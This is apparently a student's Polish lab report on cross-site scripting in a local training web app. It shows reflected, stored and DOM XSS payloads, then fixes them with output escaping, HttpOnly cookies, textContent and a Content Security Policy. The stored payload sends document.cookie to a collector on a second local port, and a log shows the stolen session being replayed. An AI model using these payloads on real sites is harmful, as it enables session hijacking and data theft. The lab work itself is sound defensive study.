# Laboratorium 6 — Cross-Site Scripting

### 341907 | 13.11.2026 | https://github.com/prodws/odwsi/tree/master/lab6

#### Zadanie 1. XSS odbity

Adres z ładunkiem:

```
http://127.0.0.1:8080/szukaj?q=%3Cscript%3Edocument.body.style.backgroundColor%3D%27red%27%3Bdocument.title%3D%27XSS-odbity%27%3C%2Fscript%3E
```

Błąd: `aplikacja/app.py`, wiersz 37. Dodano `escape(fraza)` z modułu `html`. Wyszukiwanie `/szukaj?q=konsultacje` nadal znajduje ogłoszenie.

HTML przed poprawką (odtworzony z kodu):

```html
<h1>Wyniki wyszukiwania dla: <script>document.body.style.backgroundColor='red';document.title='XSS-odbity'</script></h1>
```

HTML po poprawce:

```html
<h1>Wyniki wyszukiwania dla: &lt;script&gt;document.body.style.backgroundColor=&#x27;red&#x27;;document.title=&#x27;XSS-odbity&#x27;&lt;/script&gt;</h1>
```

Kodowanie wyjścia sprawia, że dane są tekstem, a usunięcie słowa `script` nie blokuje np. wykonania kodu przez `onerror`.

#### Zadanie 2. XSS zapisany i HttpOnly

Treść ładunku:

```html
<img src="/obraz" onerror="this.onerror=null;new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">
```

Wpis zbieracza przed zmianą:

```
zbieracz-1  | ZEBRANO: /?c=session=eyJ1enl0a293bmlr…
```

W kroku 3 użycie przejętego ciasteczka w `/notatka` zwróciło `200 OK` i prywatną notatkę Anny.

Ustawiono `SESSION_COOKIE_HTTPONLY = True`. Nagłówki logowania:

```
Przed: Set-Cookie: session=eyJ1enl0a293bmlr…; Path=/
Po:    Set-Cookie: session=eyJ1enl0a293bmlr…; HttpOnly; Path=/
```

Wpis zbieracza po zmianie i ponownym zalogowaniu:

```
zbieracz-1  | ZEBRANO: /?c=
```

HttpOnly chroni ciasteczko sesji przed odczytem przez JavaScript, ale skrypt XSS nadal może działać na stronie.

#### Zadanie 3. Naprawa i Content Security Policy

Usunięto `|safe` z treści ogłoszenia, przeniesiono skrypt do `static/podglad.js` i zastąpiono `innerHTML` przez `textContent`. Nagłówek CSP dodano przez `@app.after_request`.

| Ładunek                                                      | Przed naprawą                               | Po naprawie                                        |
| ------------------------------------------------------------ | ------------------------------------------- | -------------------------------------------------- |
| Odbity z zadania 1                                           | Czerwone tło, tytuł `XSS-odbity`            | Tekst ładunku, bez zmiany tła i tytułu             |
| Zapisany z zadania 2                                         | Żądanie do zbieracza; po HttpOnly puste `c` | Tekst ładunku, brak nowego żądania po wejściu Anny |
| DOM: `<img src="/obraz" onerror="document.title='XSS-DOM'">` | Tytuł `XSS-DOM`                             | Tekst ładunku, tytuł „Podgląd ogłoszenia”          |

Adres z ładunkiem DOM:

```
http://127.0.0.1:8080/podglad#%3Cimg%20src%3D%22%2Fobraz%22%20onerror%3D%22document.title%3D%27XSS-DOM%27%22%3E
```

Nagłówek odpowiedzi:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

Tekst `Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'` wyświetlono dosłownie, bez pogrubienia. Podgląd `/podglad#Zwykly%20tekst` pokazał „Zwykly tekst”.

CSP ogranicza wykonanie skryptów, ale nie koduje danych jako tekstu, dlatego jest dodatkową ochroną, a nie zamiennikiem kodowania wyjścia.

Logi i odpowiedzi zapisano w [dowody.md](dowody.md).
